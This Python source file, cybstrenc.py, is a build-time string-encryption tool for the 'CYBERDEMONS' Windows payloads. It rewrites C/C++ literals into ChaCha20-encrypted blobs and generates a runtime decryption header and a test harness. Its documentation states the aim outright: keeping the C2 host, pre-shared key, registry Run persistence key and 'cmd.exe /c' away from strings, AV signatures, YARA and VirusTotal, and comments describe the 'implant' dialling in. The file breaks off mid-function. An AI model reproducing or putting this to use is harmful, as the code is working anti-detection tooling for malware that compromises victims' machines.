#!/usr/bin/env python3
"""
cybstrenc.py — build-time string encryption for the CYBERDEMONS payloads.

What this does, and what it does not do
---------------------------------------
It rewrites every *string literal* in the C/C++ sources into an encrypted byte
blob plus a `CYBS_AT(blob, index)` runtime call.  The compiler never sees the
plaintext, so it never reaches `.rdata`, and `strings payload.exe` stops showing
the C2 host, the PSK, the registry Run key, `cmd.exe /c`, the help text, the
HKDF labels or any of the command verbs.

It does NOT hide variable names.  A stripped -O2 binary has no symbol table and
no local variable names, so there is nothing there to hide -- the only
literal-shaped thing in a binary is data, and that is what this encrypts.

Cipher: ChaCha20 (DJB layout, identical to cybcrypt.h's `cyb_chacha20_xor`),
32-byte key = SHA-256(passphrase), 12-byte nonce = build salt || 8 zero bytes,
block counter = the literal's index in the build.  Indices are unique per build,
so no (key, nonce, counter) pair repeats: identical literals at different call
sites produce different ciphertext, and a per-build salt means two builds from
the same source share no bytes at all.

Honest limit: the passphrase has to be recoverable by the program, so it is in
the binary in masked form.  Anyone with a deobfuscation pass gets it.  This
raises the bar for static signature matching (AV string rules, YARA, VirusTotal)
and does nothing against behavioural detection.  Obfuscate the build you ship,
never the one you debug.

Usage
-----
    python3 cybstrenc.py --key cyberdemon \
        -i pay.cpp -i cybproto.h -i cybbuf.h -o build_output/obf

    x86_64-w64-mingw32-g++ -m64 -s -O2 -mwindows -I. \
        -o build_output/payload.exe build_output/obf/pay.cpp ...

Keep `-I.` on the compile line: cybcrypt.h is deliberately *not* obfuscated, so
it is resolved from the repo root while cybproto.h / cybbuf.h / cybstr.h are
picked up from the output directory (quoted includes search the including
file's own directory first).

`--salt` (8 hex chars) makes a build reproducible; without it a random salt is
drawn and every build is byte-unique.  `cybstr_verify.c` is generated as a test
artifact -- it holds every plaintext and must never be linked into a payload.

stdlib only: hashlib is stdlib and the ChaCha20 below is ~40 lines.  The
`cryptography` package is used, if present, as an extra cross-check only.
"""

import argparse
import hashlib
import json
import os
import re
import struct
import sys

# --------------------------------------------------------------------------
# ChaCha20, DJB layout (matches cybcrypt.h: st[12] = ctr, st[13..15] = nonce)
# --------------------------------------------------------------------------

MASK = 0xFFFFFFFF


def _rotl32(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK


def _qr(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & MASK; x[d] ^= x[a]; x[d] = _rotl32(x[d], 16)
    x[c] = (x[c] + x[d]) & MASK; x[b] ^= x[c]; x[b] = _rotl32(x[b], 12)
    x[a] = (x[a] + x[b]) & MASK; x[d] ^= x[a]; x[d] = _rotl32(x[d], 8)
    x[c] = (x[c] + x[d]) & MASK; x[b] ^= x[c]; x[b] = _rotl32(x[b], 7)


def chacha20_block(key, ctr, nonce):
    """One 64-byte block.  key: 32 bytes, ctr: uint32, nonce: 12 bytes."""
    st = [0x61707865, 0x3320646E, 0x79622D32, 0x6B206574]
    st += list(struct.unpack('<8I', key))
    st += [ctr & MASK]
    st += list(struct.unpack('<3I', nonce))
    x = st[:]
    for _ in range(10):
        _qr(x, 0, 4, 8, 12)
        _qr(x, 1, 5, 9, 13)
        _qr(x, 2, 6, 10, 14)
        _qr(x, 3, 7, 11, 15)
        _qr(x, 0, 5, 10, 15)
        _qr(x, 1, 6, 11, 12)
        _qr(x, 2, 7, 8, 13)
        _qr(x, 3, 4, 9, 14)
    return struct.pack('<16I', *[(x[i] + st[i]) & MASK for i in range(16)])


def chacha20(key, nonce, data, ctr=0):
    out = bytearray()
    for off in range(0, max(len(data), 1), 64):
        ks = chacha20_block(key, ctr, nonce)
        out += bytes(a ^ b for a, b in zip(data[off:off + 64], ks))
        ctr += 1
    return bytes(out[:len(data)])


# --------------------------------------------------------------------------
# C source rewriting
# --------------------------------------------------------------------------

SIMPLE_ESC = {'n': 0x0A, 't': 0x09, 'r': 0x0D, '0': 0x00, 'a': 0x07,
              'b': 0x08, 'f': 0x0C, 'v': 0x0B, '\\': 0x5C, '"': 0x22,
              "'": 0x27, '?': 0x3F, 'e': 0x1B}


class Obfuscator:
    """Rewrites one translation unit.  `counter` is shared across the build so
    every literal in the whole binary gets a unique ChaCha20 block counter."""

    def __init__(self, key32, nonce, basename, counter, keep_plain=False):
        self.key32 = key32
        self.nonce = nonce
        self.base = basename
        self.counter = counter
        self.keep_plain = keep_plain
        self.blobs = []          # [(symbol, cipher, plain)]
        self.defines = []        # macro names whose literal body was replaced
        self.builders = []       # (buffer, function, size, widest, body)

    # -- blob table ------------------------------------------------------

    def _add_blob(self, plain):
        if b'\x00' in plain:
            raise ValueError('%s: literal contains an embedded NUL, which no '
                             'C string call site can express: %r'
                             % (self.base, plain[:40]))
        idx = self.counter[0]
        self.counter[0] += 1
        sym = 'cybs_s%d' % idx
        self.blobs.append((sym, chacha20(self.key32, self.nonce, plain, idx),
                           plain))
        return sym, idx

    @staticmethod
    def _is_plain(tail):
        """`/*cyb:plain*/` on the literal or the line above exempts it."""
        return 'cyb:plain' in tail

    @staticmethod
    def _const_expr_position(prefix):
        """True where C demands a constant expression.

        `char x[16] = "...";` is an array initialiser, so a function call there
        is a hard compile error.  Refuse loudly instead of emitting source that
        breaks three minutes into a build.
        """
        return re.match(r'^\s*[A-Za-z_][\w\s\*]*\b\w+\s*\[[^\]]*\]\s*=\s*$',
                        prefix) is not None

    # -- lexing ----------------------------------------------------------

    def _read_string(self, src, i):
        """Parse the literal at src[i] == '"' -> (end_index, decoded_bytes)."""
        j = i + 1
        out = bytearray()
        n = len(src)
        while j < n:
            c = src[j]
            if c == '\\':
                nxt = src[j + 1] if j + 1 < n else ''
                if nxt in SIMPLE_ESC:
                    out.append(SIMPLE_ESC[nxt]); j += 2; continue
                if nxt == 'x':
                    k, h = j + 2, ''
                    while k < n and len(h) < 2 and src[k] in '0123456789abcdefABCDEF':
                        h += src[k]; k += 1
                    if h:
                        out.append(int(h, 16) & 0xFF); j = k; continue
                if nxt.isdigit():
                    k, o = j + 1, ''
                    while k < n and len(o) < 3 and src[k] in '01234567':
                        o += src[k]; k += 1
                    out.append(int(o, 8) & 0xFF); j = k; continue
                out.append(ord(nxt) & 0xFF); j += 2; continue
            if c == '"':
                return j + 1, bytes(out)
            out.extend(c.encode('utf-8', 'surrogateescape'))
            j += 1
        raise ValueError('%s: unterminated string literal at offset %d'
                         % (self.base, i))

    def _skip_gap(self, src, i):
        """Advance over whitespace/comments between adjacent literals."""
        n = len(src)
        while i < n:
            if src[i] in ' \t\r\n':
                i += 1
            elif src.startswith('/*', i):
                e = src.find('*/', i + 2)
                i = n if e < 0 else e + 2
            elif src.startswith('//', i):
                e = src.find('\n', i)
                i = n if e < 0 else e + 1
            else:
                break
        return i

    def _gap_directives(self, src, i):
        """Like _skip_gap, but also collects preprocessor lines on the way.

        Adjacent string literals are concatenated by the *compiler*, but only
        after preprocessing, so a run like

            ob_puts(o, "a\\r\\n"
            #if CYB_F_FS
                        "b\\r\\n"
            #endif
                        "c\\r\\n");

        is a single string. Rewriting each literal to its own decoder call
        destroys that: the calls are not adjacent literals, so it will not
        compile. Such a run has to become a generated builder function that
        appends the parts at runtime, with the conditionals preserved inside
        it. Returns (index, [directive lines]).

        Any non-conditional directive in the gap is refused: moving an
        `#include` or a `#define` out of argument position would change the
        meaning of the file, and silently doing that is not acceptable.
        """
        n = len(src)
        found = []
        while i < n:
            if src[i] in ' \t\r\n':
                i += 1
            elif src.startswith('/*', i):
                e = src.find('*/', i + 2)
                i = n if e < 0 else e + 2
            elif src.startswith('//', i):
                e = src.find('\n', i)
                i = n if e < 0 else e + 1
            elif src.startswith('#', i):
                e = i
                while e < n:
                    e = src.find('\n', e)
                    e = n if e < 0 else e + 1
                    if e < n and src[e - 2:e] != '\\\\':
                        break
                line = src[i:e]
                if not re.match(r'#\s*(if|ifdef|ifndef|elif|else|endif)\b', line):
                    raise ValueError(
                        '%s: %r interrupts a run of adjacent literals; only '
                        'conditional directives can be moved into a builder'
                        % (self.base, line.strip()[:60]))
                found.append(line)
                i = e
            else:
                break
        return i, found

    def _skip_asm(self, src, i):
        """Consume an inline-asm statement, returning the index past it.

        Matches the whole `asm [volatile] ( ... )` including its template and
        operand lists. Returns None if this `asm` is an identifier rather than
        a statement, so the caller can fall through.
        """
        m = re.match(r'(?:__asm__|__asm|_asm|asm)\b', src[i:])
        if not m:
            return None
        j = i + m.end()
        # optional volatile / goto / inline qualifiers, then the paren
        while True:
            q = re.match(r'\s*(__volatile__|volatile|goto|inline|const)?\s*',
                         src[j:])
            if not q or not q.group(1):
                break
            j += q.end()
        rest = src[j:].lstrip()
        if not rest.startswith('('):
            return None
        j = src.index('(', j)
        depth = 0
        n = len(src)
        while j < n:
            c = src[j]
            if c == '(':
                depth += 1
            elif c == ')':
                depth -= 1
                if depth == 0:
                    return j + 1
            elif c == '"':
                _e, _d = self._read_string(src, j)
                j = _e
                continue
            elif src.startswith('/*', j):
                e = src.find('*/', j + 2)
                j = n if e < 0 else e + 2
                continue
            elif c == "'":
                j += 1
                while j < n and src[j] != "'":
                    j += 2 if src[j] == '\\' else 1
                j += 1
                continue
            j += 1
        raise ValueError('%s: unterminated asm statement at offset %d'
                         % (self.base, i))

    def _line_tail(self, out):
        tail = ''.join(out)
        return tail.rsplit('\n', 2)[-2:]

    # -- the pass --------------------------------------------------------

    def run(self, src):
        out = []
        i, n = 0, len(src)

        while i < n:
            c = src[i]

            if src.startswith('/*', i):
                e = src.find('*/', i + 2)
                e = n if e < 0 else e + 2
                out.append(src[i:e]); i = e; continue
            if src.startswith('//', i):
                e = src.find('\n', i)
                e = n if e < 0 else e + 1
                out.append(src[i:e]); i = e; continue

            if c == "'":                       # character literal: never touch
                j = i + 1
                while j < n:
                    if src[j] == '\\':
                        j += 2; continue
                    if src[j] == "'":
                        j += 1; break
                    j += 1
                out.append(src[i:j]); i = j; continue

            # GCC inline asm: the first operand is a template the *assembler*
            # consumes, not a C string. Rewriting it produces uncompilable
            # code ("cpuid" must stay "cpuid"), so pass the whole statement
            # through untouched.
            if (re.match(r'(?:__asm__|__asm|_asm|asm)\b', src[i:]) and
                    not (i and re.match(r'\w', src[i - 1]))):
                j = self._skip_asm(src, i)
                if j is not None:
                    out.append(src[i:j]); i = j; continue

            tail = self._line_tail(out)
            if c == '#' and tail[-1].strip() == '':
                i = self._directive(src, i, out); continue

            if c == '"':
                line_prefix = tail[-1]
                parts = []                     # [(plain, [directives gating it])]
                pending = []                   # directives trailing the run
                end = i
                j = i
                while j < n:                   # fold adjacent literals
                    gap = j
                    j, dirs = self._gap_directives(src, j)
                    if j >= n or src[j] != '"':
                        j = gap
                        pending = dirs         # nothing left for them to gate
                        break
                    j, dec = self._read_string(src, j)
                    # The directives just skipped gate THIS literal: they sit
                    # between the previous one and this one, and _builder emits
                    # them immediately above it. Carrying the previous
                    # iteration's set instead shifts every guard one literal
                    # late -- a -DCYB_MINIMAL build then advertises the first
                    # guarded verb (!ls, absent) and hides the last unguarded
                    # one (!exit, present).
                    parts.append((dec, dirs))
                    end = j
                if self._is_plain('\n'.join(tail)):
                    out.append(src[i:end]); i = end; continue
                if self._const_expr_position(line_prefix):
                    raise ValueError(
                        '%s: array initialiser needs a constant expression: %r\n'
                        '    Refactor to a decoded pointer before obfuscating.'
                        % (self.base, parts[0][0][:48]))

                if any(d for _p, d in parts) or pending:
                    # Conditional compilation inside the run: the parts are only
                    # one string after preprocessing, so they are joined at
                    # runtime with the directives preserved.
                    call = self._builder(parts, pending)
                else:
                    # No directives: the compiler would have concatenated these,
                    # so encrypt the concatenation as a single literal.
                    sym, idx = self._add_blob(b''.join(p for p, _d in parts))
                    call = 'CYBS_AT(%s, %d)' % (sym, idx)
                out.append(call)
                i = end; continue

            out.append(c)
            i += 1

        return ''.join(out)

    def _builder(self, parts, pending):
        """Emit a function that concatenates a conditional run of literals.

        Generated shape, for the help text in pay.cpp:

            static char cybs_cat3[900];
            CYB_INLINE const char *cybs_cat3f(void)
            {
                char *d = cybs_cat3;
            #if CYB_F_FS
                { const char *s = CYBS_AT(cybs_s100, 100);
                  while (*s) *d++ = *s++; }
            #endif
                *d = 0;
                return cybs_cat3;
            }

        The size is the sum of the parts that actually compile in, computed
        here for *every* configuration, so a CYB_MINIMAL build still has a
        buffer large enough for the full-featured one. The same conditionals
        guard the writes, so the unused parts are dead code and the linker
        drops them -- a minimal build does not carry the help text for
        capabilities it does not have.
        """
        n = len(self.builders)
        buf = 'cybs_cat%d' % n
        fun = 'cybs_cat%df' % n
        total = sum(len(p) for p, _d in parts) + 1
        widest = max((len(p) for p, _d in parts), default=0)

        body = ['static char %s[%d];' % (buf, total),
                'CYB_INLINE const char *%s(void)' % fun,
                '{',
                '    char *d = %s;' % buf]
        for plain, dirs in parts:
            body.extend(dirs)
            sym, idx = self._add_blob(plain)
            body.append('    { const char *s = CYBS_AT(%s, %d);' % (sym, idx))
            body.append('      while (*s) *d++ = *s++; }')
        body.extend(pending)
        body.append('    *d = 0;')
        body.append('    return %s;' % buf)
        body.append('}')
        self.builders.append((buf, fun, total, widest, '\n'.join(body)))
        return '%s()' % fun

    def _directive(self, src, i, out):
        """Rewrite `#define NAME "..."`; pass every other directive through.

        The blob itself lands in the table block at the top of the file, so the
        macro simply becomes a call.  A `-DNAME=` override from the compiler
        still wins, because the `#ifndef` guard around it is preserved.
        """
        end = src.find('\n', i)
        end = len(src) if end < 0 else end
        line = src[i:end]
        while line.endswith('\\') and end < len(src):
            nxt = src.find('\n', end + 1)
            nxt = len(src) if nxt < 0 else nxt
            # Drop the continuation backslash. Leaving it in turns a
            # multi-line #define into a stray '\' in program text, which is
            # exactly the kind of silent breakage this tool must not do --
            # cybcrypt.h's CYB_QR is written as a \ continued macro.
            line = line[:-1] + src[end + 1:nxt]
            end = nxt

        m = re.match(r'^(#\s*define\s+)([A-Za-z_]\w*)(.*?)'
                     r'("(?:[^"\\]|\\.)*")\s*$', line)
        if not m:
            out.append(line)
            return end
        if self._is_plain('\n'.join(self._line_tail(out))):
            out.append(line)
            return end

        lead, macro, mid, lit = m.groups()
        _e, plain = self._read_string(lit, 0)
        sym, idx = self._add_blob(plain)
        self.defines.append(macro)
        out.append('%s%s CYBS_AT(%s, %d)%s' % (lead, macro, sym, idx, mid))
        return end

    # -- emitted table ---------------------------------------------------
    # Blobs are emitted into cybstr.h rather than into each source file, so
    # there is exactly one copy per translation unit (the include guard) and
    # the verification harness sees the same arrays the implant decodes from.


# --------------------------------------------------------------------------
# generated runtime header
# --------------------------------------------------------------------------

HEADER_TMPL = r'''/*
 * cybstr.h -- runtime string decryption for CYBERDEMONS payloads.
 * GENERATED by cybstrenc.py -- do not edit.
 *
 * ChaCha20 (DJB layout, same primitive as cybcrypt.h), key = SHA-256 of the
 * passphrase, nonce = build salt, block counter = the literal's build index.
 * The passphrase is stored masked: that is obfuscation, not cryptography, and
 * it exists to keep plaintext out of .rdata for static matching.
 */
#ifndef CYB_STR_H
#define CYB_STR_H

#include <string.h>
#include <stddef.h>
#include <stdint.h>

/* This header is deliberately self-contained: it does NOT include
 * cybcrypt.h. cybcrypt.h is itself an obfuscation input, and a rewritten
 * literal in it needs the decoder half way down its own body -- which is
 * before cybcrypt.h has defined cyb_sha256 or cyb_secure_zero. Depending on
 * cybcrypt.h would be circular. So the two small primitives it needs are
 * spelled out here.
 *
 * The SHA-256 below is a second implementation of one cybcrypt.h already has.
 * That is a real duplication risk, and it is contained the only way that
 * matters: if the two ever disagree, every literal in the build decodes to
 * garbage and the generated cybstr_verify.c harness reports 100%% mismatch on
 * the next build. It cannot ship broken. */
#if defined(_MSC_VER)
#  define CYB_INLINE static __forceinline
#else
#  define CYB_INLINE static inline
#endif

CYB_INLINE void cybs_zero(void *p, size_t n)
{
    volatile unsigned char *v = (volatile unsigned char *)p;
    while (n--) *v++ = 0;
}

CYB_INLINE uint32_t cybs_rotr(uint32_t x, unsigned n)
{
    return (x >> n) | (x << (32 - n));
}

CYB_INLINE void cybs_sha256(const uint8_t *msg, size_t len, uint8_t out[32])
{
    static const uint32_t k[64] = {
        0x428a2f98UL, 0x71374491UL, 0xb5c0fbcfUL, 0xe9b5dba5UL,
        0x3956c25bUL, 0x59f111f1UL, 0x923f82a4UL, 0xab1c5ed5UL,
        0xd807aa98UL, 0x12835b01UL, 0x243185beUL, 0x550c7dc3UL,
        0x72be5d74UL, 0x80deb1feUL, 0x9bdc06a7UL, 0xc19bf174UL,
        0xe49b69c1UL, 0xefbe4786UL, 0x0fc19dc6UL, 0x240ca1ccUL,
        0x2de92c6fUL, 0x4a7484aaUL, 0x5cb0a9dcUL, 0x76f988daUL,
        0x983e5152UL, 0xa831c66dUL, 0xb00327c8UL, 0xbf597fc7UL,
        0xc6e00bf3UL, 0xd5a79147UL, 0x06ca6351UL, 0x14292967UL,
        0x27b70a85UL, 0x2e1b2138UL, 0x4d2c6dfcUL, 0x53380d13UL,
        0x650a7354UL, 0x766a0abbUL, 0x81c2c92eUL, 0x92722c85UL,
        0xa2bfe8a1UL, 0xa81a664bUL, 0xc24b8b70UL, 0xc76c51a3UL,
        0xd192e819UL, 0xd6990624UL, 0xf40e3585UL, 0x106aa070UL,
        0x19a4c116UL, 0x1e376c08UL, 0x2748774cUL, 0x34b0bcb5UL,
        0x391c0cb3UL, 0x4ed8aa4aUL, 0x5b9cca4fUL, 0x682e6ff3UL,
        0x748f82eeUL, 0x78a5636fUL, 0x84c87814UL, 0x8cc70208UL,
        0x90befffaUL, 0xa4506cebUL, 0xbef9a3f7UL, 0xc67178f2UL };
    uint32_t h[8] = { 0x6a09e667UL, 0xbb67ae85UL, 0x3c6ef372UL, 0xa54ff53aUL,
                      0x510e527fUL, 0x9b05688cUL, 0x1f83d9abUL, 0x5be0cd19UL };
    uint8_t  blk[64];
    size_t   off = 0, total = ((len + 9 + 63) / 64) * 64;
    uint32_t w[64], a, b, c, d, e, f, g, hh, s0, s1, t1, t2;
    unsigned i;

    for (i = 0; i < total; i++) {
        blk[i] = (i < len) ? msg[i] : 0;
    }
    blk[len] = 0x80;
    for (i = 0; i < 8; i++)
        blk[total - 1 - i] = (uint8_t)((uint64_t)len * 8 >> (8 * i));

    while (off < total) {
        for (i = 0; i < 16; i++)
            w[i] = ((uint32_t)blk[off + i * 4] << 24) |
                   ((uint32_t)blk[off + i * 4 + 1] << 16) |
                   ((uint32_t)blk[off + i * 4 + 2] << 8) |
                   ((uint32_t)blk[off + i * 4 + 3]);
        for (i = 16; i < 64; i++) {
            s0 = cybs_rotr(w[i - 15], 7) ^ cybs_rotr(w[i - 15], 18) ^ (w[i - 15] >> 3);
            s1 = cybs_rotr(w[i - 2], 17) ^ cybs_rotr(w[i - 2], 19) ^ (w[i - 2] >> 10);
            w[i] = w[i - 16] + s0 + w[i - 7] + s1;
        }
        a = h[0]; b = h[1]; c = h[2]; d = h[3];
        e = h[4]; f = h[5]; g = h[6]; hh = h[7];
        for (i = 0; i < 64; i++) {
            s1 = cybs_rotr(e, 6) ^ cybs_rotr(e, 11) ^ cybs_rotr(e, 25);
            t1 = hh + s1 + ((e & f) ^ (~e & g)) + k[i] + w[i];
            s0 = cybs_rotr(a, 2) ^ cybs_rotr(a, 13) ^ cybs_rotr(a, 22);
            t2 = s0 + ((a & b) ^ (a & c) ^ (b & c));
            hh = g; g = f; f = e; e = d + t1;
            d = c; c = b; b = a; a = t1 + t2;
        }
        h[0] += a; h[1] += b; h[2] += c; h[3] += d;
        h[4] += e; h[5] += f; h[6] += g; h[7] += hh;
        off += 64;
    }
    for (i = 0; i < 8; i++) {
        out[i * 4]     = (uint8_t)(h[i] >> 24);
        out[i * 4 + 1] = (uint8_t)(h[i] >> 16);
        out[i * 4 + 2] = (uint8_t)(h[i] >> 8);
        out[i * 4 + 3] = (uint8_t)h[i];
    }
    cybs_zero(w, sizeof(w));
    cybs_zero(blk, sizeof(blk));
}

#define CYBS_PW_LEN %(pw_len)d
#define CYBS_NONCE   { %(nonce)s }
#define CYBS_N       %(nlit)d

static const unsigned char cybs_pw_a[] = { %(pw_a)s };
static const unsigned char cybs_pw_b[] = { %(pw_b)s };

static uint8_t  cybs_key[32];
static int      cybs_ready;

CYB_INLINE uint32_t cybs_rotl(uint32_t x, unsigned n)
{
    return (x << n) | (x >> (32 - n));
}

CYB_INLINE void cybs_qr(uint32_t *x, unsigned a, unsigned b, unsigned c, unsigned d)
{
    x[a] += x[b]; x[d] ^= x[a]; x[d] = cybs_rotl(x[d], 16);
    x[c] += x[d]; x[b] ^= x[c]; x[b] = cybs_rotl(x[b], 12);
    x[a] += x[b]; x[d] ^= x[a]; x[d] = cybs_rotl(x[d],  8);
    x[c] += x[d]; x[b] ^= x[c]; x[b] = cybs_rotl(x[b],  7);
}

CYB_INLINE void cybs_ks(const uint8_t key[32], uint32_t ctr,
                        const uint8_t nonce[12], uint8_t out[64])
{
    uint32_t st[16], x[16];
    unsigned i;

    st[0] = 0x61707865UL; st[1] = 0x3320646eUL;
    st[2] = 0x79622d32UL; st[3] = 0x6b206574UL;
    for (i = 0; i < 8; i++)
        st[4 + i] = (uint32_t)key[i * 4] | ((uint32_t)key[i * 4 + 1] << 8) |
                    ((uint32_t)key[i * 4 + 2] << 16) |
                    ((uint32_t)key[i * 4 + 3] << 24);
    st[12] = ctr;
    st[13] = (uint32_t)nonce[0] | ((uint32_t)nonce[1] << 8) |
             ((uint32_t)nonce[2] << 16) | ((uint32_t)nonce[3] << 24);
    st[14] = (uint32_t)nonce[4] | ((uint32_t)nonce[5] << 8) |
             ((uint32_t)nonce[6] << 16) | ((uint32_t)nonce[7] << 24);
    st[15] = (uint32_t)nonce[8] | ((uint32_t)nonce[9] << 8) |
             ((uint32_t)nonce[10] << 16) | ((uint32_t)nonce[11] << 24);
    for (i = 0; i < 16; i++) x[i] = st[i];

    for (i = 0; i < 10; i++) {
        cybs_qr(x, 0, 4,  8, 12); cybs_qr(x, 1, 5,  9, 13);
        cybs_qr(x, 2, 6, 10, 14); cybs_qr(x, 3, 7, 11, 15);
        cybs_qr(x, 0, 5, 10, 15); cybs_qr(x, 1, 6, 11, 12);
        cybs_qr(x, 2, 7,  8, 13); cybs_qr(x, 3, 4,  9, 14);
    }
    for (i = 0; i < 16; i++) {
        uint32_t v = x[i] + st[i];
        out[i * 4]     = (uint8_t)(v);
        out[i * 4 + 1] = (uint8_t)(v >> 8);
        out[i * 4 + 2] = (uint8_t)(v >> 16);
        out[i * 4 + 3] = (uint8_t)(v >> 24);
    }
}

/* Called once.  The passphrase is unmasked, hashed, and destroyed.
 *
 * The volatile pointer is load-bearing, not decoration. Both mask arrays are
 * compile-time constants, so without it the optimiser constant-folds the
 * unmask AND the SHA-256 and materialises the *plaintext* passphrase as
 * immediates in .text -- measured on a real build, `strings` showed
 * "cyberdem"/"on" sitting in the code section, which is strictly worse than
 * not masking at all. The barrier forces the work to happen at run time.
 */
CYB_INLINE void cybs_init(void)
{
    uint8_t          pw[64];
    unsigned         i;
    const volatile unsigned char *a = cybs_pw_a;
    const volatile unsigned char *b = cybs_pw_b;

    if (cybs_ready) return;
    for (i = 0; i < CYBS_PW_LEN && i < sizeof(pw); i++)
        pw[i] = (uint8_t)(a[i] ^ b[i]);
    cybs_sha256(pw, CYBS_PW_LEN, cybs_key);
    cybs_zero(pw, sizeof(pw));
    cybs_ready = 1;
}

/* Decrypt one literal into ITS OWN buffer and return it as a C string.
 *
 * One buffer per literal, not a rotating ring of shared slots. A ring is the
 * obvious design and it is wrong: a decoded pointer routinely has to outlive
 * the next decode, and a ring silently invalidates it once the ring wraps.
 * Measured on this repo, `psk_from_hex(PSK_HEX, psk)` came back with 15 of 32
 * key bytes and the implant dialled in with a zero PSK -- the PSK string had
 * been overwritten by an unrelated format-string decode 16 calls earlier. With
 * a ring, correctness depends on the *call site's* distance from the previous
 * ring reuse, which no compiler checks and no reviewer can see.
 *
 * The cost is plaintext residency: a decoded literal stays in .bss until the
 * process exits, instead of being wiped after 16 decodes. cybs_wipe() below
 * scrubs everything on demand. That is the right way round -- a wiped string
 * that something still points at is a wrong answer, not a safe one.
 */
CYB_INLINE const char *cybs_dec(const unsigned char *ct, unsigned n,
                                unsigned idx, char *buf)
{
    static const uint8_t nonce[12] = CYBS_NONCE;
    uint8_t  ks[64];
    unsigned off = 0;

    cybs_init();

    while (off < n) {
        unsigned take = n - off, k;
        if (take > 64) take = 64;
        cybs_ks(cybs_key, (uint32_t)(idx + off / 64), nonce, ks);
        for (k = 0; k < take; k++)
            buf[off + k] = (char)((unsigned char)ct[off + k] ^ ks[k]);
        off += take;
    }
    buf[n] = 0;
    cybs_zero(ks, sizeof(ks));
    return buf;
}

/* Scrub every decoded literal and the derived key. Only safe to call once the
 * caller holds no decoded pointer -- `host` in the implant's main() outlives
 * the handshake, so the payload deliberately never calls this. */

#define CYBS_AT(sym, idx) cybs_dec((sym), (unsigned)sizeof(sym), (unsigned)(idx), cybs_buf_ ## idx)
%(table)s
static char *const cybs_bufs[CYBS_N] = { %(bufs)s };
static const unsigned cybs_buflen[CYBS_N] = { %(buflens)s };

CYB_INLINE void cybs_wipe(void)
{
    unsigned i;
    for (i = 0; i < CYBS_N; i++)
        cybs_zero(cybs_bufs[i], cybs_buflen[i]);
    cybs_zero(cybs_key, sizeof(cybs_key));
}
#endif /* CYB_STR_H */
'''


def make_header(pw, nonce, blobs):
    a, b = bytearray(), bytearray()
    for i, ch in enumerate(pw):
        m = ((i * 0x5D) ^ (0xA7 + (i << 3)) ^ ((i * 31) & 0xFF)) & 0xFF
        a.append(ch ^ m)
        b.append(m)

    table = ['\n/* --- encrypted string literals, generated by cybstrenc.py --- */']
    bufs, buflens = [], []
    for sym, ct, _p in blobs:
        idx = int(sym[len('cybs_s'):])
        plain_len = len(_p)
        table.append('static const unsigned char %s[] = {%s};'
                     % (sym, ','.join(str(b) for b in ct)))
        # Exact size, +1 for the NUL cybs_dec writes. Sizing to the literal
        # instead of the longest one keeps the whole pool at sum(len)+N bytes
        # (~8 KB for a full build) rather than N x longest (~225 KB).
        table.append('static char cybs_buf_%d[%d];' % (idx, plain_len + 1))
        bufs.append('cybs_buf_%d' % idx)
        buflens.append('%d' % plain_len)
        # Compile-time proof that the ciphertext array and its decode buffer
        # are the same length. If they ever drift, buf[n] would write one past
        # the end -- and for a command verb or a format string that is a bug
        # that only shows up on someone else's host.
        table.append('typedef char cybs_fit_%s[(sizeof(%s) + 1 == sizeof(cybs_buf_%d)) ? 1 : -1];'
                     % (sym, sym, idx))

    return HEADER_TMPL % {
        'pw_a': ','.join(str(x) for x in a),
        'pw_b': ','.join(str(x) for x in b),
        'pw_len': len(a),
        'nonce': ','.join(str(x) for x in nonce),
        'nlit': len(blobs),
        'bufs': ','.join(bufs),
        'buflens': ','.join(buflens),
        'table': '\n'.join(table) + '\n',
    }


# --------------------------------------------------------------------------
# verification harness
# --------------------------------------------------------------------------

HARNESS_TMPL = r'''/*
 * cybstr_verify.c -- GENERATED by cybstrenc.py.  TEST ARTIFACT ONLY.
 *
 * It contains every plaintext, so it must never be linked into a payload.
 * Decodes each blob through the same runtime path the implant uses and
 * compares byte for byte.  Non-zero exit means the C decoder and the Python
 * encoder disagree -- do not ship that build.
 */
#include <stdio.h>
#include <string.h>

#include "cybstr.h"

static const unsigned char *const cybv_blob[] = {
%(blobs)s};

static const unsigned cybv_len[] = {
%(lens)s};

static const char *const cybv_want[] = {
%(wants)s};

int main(void)
{
    /* The harness decodes into its OWN buffers and holds the pointers while
     * the real runtime buffers get churned underneath. That is the property
     * the payload depends on and the one the old shared-ring runtime broke:
     * a decoded string stays valid no matter how many decodes happen after
     * it. A 16-slot ring corrupted every build with more than 16 decodes,
     * which is every real build. */
    static char hold[CYBS_N][%(maxlen)d + 1];
    static char scratch[%(maxlen)d + 1];
    unsigned i, n = (unsigned)(sizeof(cybv_want) / sizeof(cybv_want[0]));
    unsigned r, bad = 0, bytes = 0;

    if (n != CYBS_N) { printf("FAIL index count %%u != %%u", n, CYBS_N); return 1; }

    /* Pass 1: decode everything once, keep the pointers. */
    for (i = 0; i < n; i++)
        (void)cybs_dec(cybv_blob[i], cybv_len[i], i, hold[i]);

    /* Pass 2: churn the real per-literal buffers. 4n decodes, far past any
     * plausible shared-ring capacity. */
    for (r = 0; r < 4; r++)
        for (i = 0; i < n; i++)
            (void)cybs_dec(cybv_blob[i], cybv_len[i], i, cybs_bufs[i]);

    /* Pass 3: the pass-1 pointers must still hold the right bytes. */
    for (i = 0; i < n; i++) {
        if (strlen(hold[i]) != cybv_len[i] ||
            memcmp(hold[i], cybv_want[i], cybv_len[i]) != 0) {
            printf("FAIL [%%u] stale want %%.60s got %%.60s",
                   i, cybv_want[i], hold[i]);
            bad++;
        }
        bytes += cybv_len[i];
    }

    /* Pass 4: one shared scratch buffer -- the exact pattern the ring made
     * unsafe -- checked on every single call. */
    for (i = 0; i < n; i++) {
        const char *got = cybs_dec(cybv_blob[i], cybv_len[i], i, scratch);
        if (strlen(got) != cybv_len[i] ||
            memcmp(got, cybv_want[i], cybv_len[i]) != 0) {
            printf("FAIL [%%u] scratch want %%.60s got %%.60s",
                   i, cybv_want[i], got);
            bad++;
        }
    }

    printf("cybstrenc: %%u literals, %%u bytes, %%u mismatches\n", n, bytes, bad);
    cybs_wipe();
    cybs_zero(hold, sizeof(hold));
    cybs_zero(scratch, sizeof(scratch));
    return bad ? 1 : 0;
}
'''


def c_escape(b):
    out = []
    for ch in b:
        c = chr(ch)
        if c == '"':
            out.append('\\"')
        elif c == '\\':
            out.append('\\\\')
        elif c == '\n':
            out.append('\\n')
        elif c == '\r':
            out.append('\\r')
        elif c == '\t':
            out.append('\\t')
        elif 0x20 <= ch < 0x7F:
            out.append(c)
        else:
            out.append('\\x%02x' % ch)
    text = ''.join(out)
